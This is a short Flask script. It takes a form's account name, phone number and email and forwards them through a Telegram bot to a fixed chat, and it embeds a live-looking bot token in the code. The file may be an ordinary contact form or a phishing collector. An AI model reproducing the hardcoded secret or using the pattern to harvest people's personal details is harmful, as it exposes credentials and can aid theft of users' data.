from flask import Flask, render_template, request
import telebot

TOKEN = '5812622585:AAEmSPaUKnhkpVGV7E6XF8snXmIy4Wp9ClY'

bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

@app.route("/", methods = ['GET', 'POST'])
def hello():
    if request.method == 'POST':
    	name = request.form['user']
    	phone = request.form['PhoneNumber']
    	email = request.form['Email']
    	bot.send_message(1196243845, f'имя акааунта: {name}, телефон:  {phone}, email: {email} ')
    return render_template("index.html")

if __name__ == "__main__":
    app.run()